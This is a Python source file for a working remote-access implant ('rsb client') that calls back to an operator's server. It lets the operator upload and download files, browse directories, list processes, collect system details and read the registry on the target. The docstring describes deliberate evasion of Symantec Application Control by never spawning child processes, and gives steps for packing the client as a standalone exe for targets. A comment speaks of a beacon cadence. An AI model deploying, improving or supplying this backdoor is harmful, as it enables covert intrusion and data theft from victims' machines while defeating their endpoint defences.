#!/usr/bin/env python3
"""rsb_client.py - standalone Python client for rsb protocol v2.

Pure stdlib (ctypes/winreg on Windows). No subprocess anywhere - every
command runs in-process, same evasion philosophy as the C client: nothing
is ever spawned, so SEP Application Control has no child process to block.

Usage:  rsb_client.py <server-ip> <port>
        (or the compiled onefile exe: rsb_client_py.exe <server-ip> <port>)

Compile a standalone exe (no Python needed on target):
  - on Windows:  pip install pyinstaller && pyinstaller -F rsb_client.py
  - cross from Linux: nuitka --onefile --mingw64 --assume-yes-for-downloads rsb_client.py
"""
import os
import sys
import time
import socket
import struct
import getpass

MAX_FRAME = 256 * 1024 * 1024
HELP_TEXT = (
    "help\n"
    "ls [path]                   list directory\n"
    "pwd                         print current directory\n"
    "cd <path>                   change directory\n"
    "get <path>                  download file from target\n"
    "put <path>                  upload file to target\n"
    "whoami                      current user (DOMAIN\\user)\n"
    "hostname                    computer name\n"
    "ipconfig                    hostname addresses, MAC\n"
    "ps                          process list (pid/ppid/threads/name)\n"
    "sysinfo                     host / OS / arch / RAM / uptime\n"
    "regq <root> <key> <val>     read registry value (HKLM/HKCU/HKU/HKCR/HKCC)\n"
    "exit                        terminate client\n"
).encode("utf-8")

CWD = [os.getcwd()]


def recv_all(s, n):
    buf = b""
    while len(buf) < n:
        chunk = s.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("closed")
        buf += chunk
    return buf


def send_framed(s, payload):
    s.sendall(struct.pack("<I", len(payload)))
    s.sendall(payload)


def recv_framed(s):
    n = struct.unpack("<I", recv_all(s, 4))[0]
    if not (0 < n <= MAX_FRAME):
        raise ConnectionError("bad frame length")
    return recv_all(s, n)


def cmd_ls(sock, arg):
    path = arg.strip() or CWD[0]
    try:
        lines = []
        for name in os.listdir(path):
            full = os.path.join(path, name)
            if os.path.isdir(full):
                lines.append(name + "    <DIR>")
            else:
                try:
                    sz = os.path.getsize(full)
                except OSError:
                    sz = 0
                lines.append("%d    %s" % (sz, name))
        out = ("\n".join(lines) + "\n").encode("utf-8", "replace")
    except OSError as e:
        out = ("ERROR: %s\n" % e).encode("utf-8", "replace")
    send_framed(sock, out)


def cmd_pwd(sock):
    send_framed(sock, (CWD[0] + "\n").encode("utf-8", "replace"))


def cmd_cd(sock, arg):
    try:
        os.chdir(arg.strip())
        CWD[0] = os.getcwd()
        send_framed(sock, b"OK\n")
    except OSError as e:
        send_framed(sock, ("ERROR: %s\n" % e).encode("utf-8", "replace"))


def cmd_get(sock, arg):
    try:
        with open(arg.strip(), "rb") as f:
            data = f.read()
        if len(data) > MAX_FRAME:
            send_framed(sock, b"0ERROR: file too large")
        else:
            send_framed(sock, b"1" + data)
    except OSError as e:
        send_framed(sock, ("0ERROR: %s" % e).encode("utf-8", "replace"))


def cmd_put(sock, arg):
    try:
        payload = recv_framed(sock)
    except ConnectionError:
        return
    if not payload or payload[0] != ord("1"):
        send_framed(sock, (payload[1:].decode("utf-8", "replace") + "\n").encode("utf-8"))
        return
    try:
        with open(arg.strip(), "wb") as f:
            f.write(payload[1:])
        ack = "written %d bytes\n" % (len(payload) - 1)
    except OSError as e:
        ack = "ERROR: %s\n" % e
    send_framed(sock, ack.encode("utf-8", "replace"))


def cmd_whoami(sock):
    dom = os.environ.get("USERDOMAIN", "")
    user = getpass.getuser()
    send_framed(sock, ("%s\\%s\n" % (dom, user)).encode("utf-8", "replace"))


def cmd_ipconfig(sock):
    import uuid
    out = []
    mac = uuid.getnode()
    if mac and not (mac >> 40) & 1:  # skip multicast/random MACs
        out.append("  mac:    " + ":".join(
            "%02x" % ((mac >> shift) & 0xFF) for shift in range(40, -1, -8)))
    try:
        seen = set()
        for fam, _t, _p, _c, addr in socket.getaddrinfo(socket.gethostname(), None):
            if addr[0] not in seen:
                seen.add(addr[0])
                out.append("  addr:   " + addr[0])
    except OSError:
        pass
    if not out:
        out.append("ERROR: no adapter info")
    send_framed(sock, ("\n".join(out) + "\n").encode("utf-8", "replace"))


def cmd_ps(sock):
    import ctypes
    from ctypes import wintypes
    TH32CS_SNAPPROCESS = 0x2
    INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value

    class PROCESSENTRY32W(ctypes.Structure):
        _fields_ = [
            ("dwSize", wintypes.DWORD),
            ("cntUsage", wintypes.DWORD),
            ("th32ProcessID", wintypes.DWORD),
            ("th32DefaultHeapID", ctypes.POINTER(wintypes.ULONG)),
            ("th32ModuleID", wintypes.DWORD),
            ("cntThreads", wintypes.DWORD),
            ("th32ParentProcessID", wintypes.DWORD),
            ("pcPriClassBase", ctypes.c_long),
            ("dwFlags", wintypes.DWORD),
            ("szExeFile", ctypes.c_wchar * 260),
        ]

    kernel32 = ctypes.windll.kernel32
    snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap == INVALID_HANDLE_VALUE:
        send_framed(sock, b"ERROR: snapshot failed\n")
        return
    lines = ["pid\tppid\tthreads\tname"]
    pe = PROCESSENTRY32W()
    pe.dwSize = ctypes.sizeof(PROCESSENTRY32W)
    try:
        if kernel32.Process32FirstW(snap, ctypes.byref(pe)):
            while True:
                lines.append("%d\t%d\t%d\t%s" % (
                    pe.th32ProcessID, pe.th32ParentProcessID,
                    pe.cntThreads, pe.szExeFile))
                if not kernel32.Process32NextW(snap, ctypes.byref(pe)):
                    break
    finally:
        kernel32.CloseHandle(snap)
    send_framed(sock, ("\n".join(lines) + "\n").encode("utf-8", "replace"))


def cmd_sysinfo(sock):
    import ctypes
    from ctypes import wintypes
    out = []
    out.append("host:     " + socket.gethostname())
    dom = os.environ.get("USERDOMAIN", "")
    out.append("user:     " + ("%s\\" % dom if dom else "") + getpass.getuser())
    out.append("os:       " + __import__("platform").platform())
    out.append("arch:     %s (%s logical processors)" % (
        __import__("platform").machine(), os.cpu_count()))

    class MEMORYSTATUSEX(ctypes.Structure):
        _fields_ = [
            ("dwLength", wintypes.DWORD),
            ("dwMemoryLoad", wintypes.DWORD),
            ("ullTotalPhys", ctypes.c_ulonglong),
            ("ullAvailPhys", ctypes.c_ulonglong),
            ("ullTotalPageFile", ctypes.c_ulonglong),
            ("ullAvailPageFile", ctypes.c_ulonglong),
            ("ullTotalVirtual", ctypes.c_ulonglong),
            ("ullAvailVirtual", ctypes.c_ulonglong),
            ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
        ]

    ms = MEMORYSTATUSEX()
    ms.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
    if ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(ms)):
        out.append("ram:      %d MB total / %d MB free" % (
            ms.ullTotalPhys // 1048576, ms.ullAvailPhys // 1048576))
    try:
        up = ctypes.windll.kernel32.GetTickCount64()
    except AttributeError:          # XP: symbol absent
        up = ctypes.windll.kernel32.GetTickCount()
    up //= 1000
    out.append("uptime:   %dd %dh %dm" % (up // 86400, (up // 3600) % 24, (up // 60) % 60))
    send_framed(sock, ("\n".join(out) + "\n").encode("utf-8", "replace"))


def cmd_regq(sock, arg):
    out = None
    try:
        import shlex
        import winreg
        parts = shlex.split(arg)
        if len(parts) != 3:
            raise ValueError("usage: regq <root> <subkey> <value>")
        roots = {
            "HKLM": winreg.HKEY_LOCAL_MACHINE,
            "HKEY_LOCAL_MACHINE": winreg.HKEY_LOCAL_MACHINE,
            "HKCU": winreg.HKEY_CURRENT_USER,
            "HKEY_CURRENT_USER": winreg.HKEY_CURRENT_USER,
            "HKU": winreg.HKEY_USERS,
            "HKEY_USERS": winreg.HKEY_USERS,
            "HKCR": winreg.HKEY_CLASSES_ROOT,
            "HKEY_CLASSES_ROOT": winreg.HKEY_CLASSES_ROOT,
            "HKCC": winreg.HKEY_CURRENT_CONFIG,
            "HKEY_CURRENT_CONFIG": winreg.HKEY_CURRENT_CONFIG,
        }
        root = roots[parts[0].upper()]
        with winreg.OpenKey(root, parts[1], 0,
                            winreg.KEY_QUERY_VALUE | winreg.KEY_WOW64_64KEY) as k:
            val, _typ = winreg.QueryValueEx(k, parts[2])
        if isinstance(val, int):
            out = "0x%08x (%d)\n" % (val, val)
        elif isinstance(val, list):          # REG_MULTI_SZ
            out = "".join("%s\n" % v for v in val)
        else:
            out = "%s\n" % val
    except Exception as e:
        out = "ERROR: %s\n" % e
    send_framed(sock, out.encode("utf-8", "replace"))


def main():
    if len(sys.argv) != 3:
        return 1
    host, port = sys.argv[1], int(sys.argv[2])

    sock = None
    for _attempt in range(10):              # 10s cadence, not beacon-fast
        try:
            sock = socket.create_connection((host, port), timeout=10)
            break
        except OSError:
            time.sleep(10)
    if sock is None:
        return 1

    try:
        while True:
            try:
                cmd = recv_framed(sock).decode("utf-8", "replace").rstrip()
            except ConnectionError:
                break
            if cmd == "exit":
                break
            elif cmd == "ls":
                cmd_ls(sock, "")
            elif cmd.startswith("ls "):
                cmd_ls(sock, cmd[3:])
            elif cmd == "pwd":
                cmd_pwd(sock)
            elif cmd.startswith("cd "):
                cmd_cd(sock, cmd[3:])
            elif cmd.startswith("get "):
                cmd_get(sock, cmd[4:])
            elif cmd.startswith("put "):
                cmd_put(sock, cmd[4:])
            elif cmd == "whoami":
                cmd_whoami(sock)
            elif cmd == "hostname":
                send_framed(sock, (socket.gethostname() + "\n").encode("utf-8", "replace"))
            elif cmd == "ipconfig":
                cmd_ipconfig(sock)
            elif cmd == "ps":
                cmd_ps(sock)
            elif cmd == "sysinfo":
                cmd_sysinfo(sock)
            elif cmd.startswith("regq "):
                cmd_regq(sock, cmd[5:])
            elif cmd == "help":
                send_framed(sock, HELP_TEXT)
            else:
                send_framed(sock, b"ERROR: unknown command\n")
    finally:
        sock.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
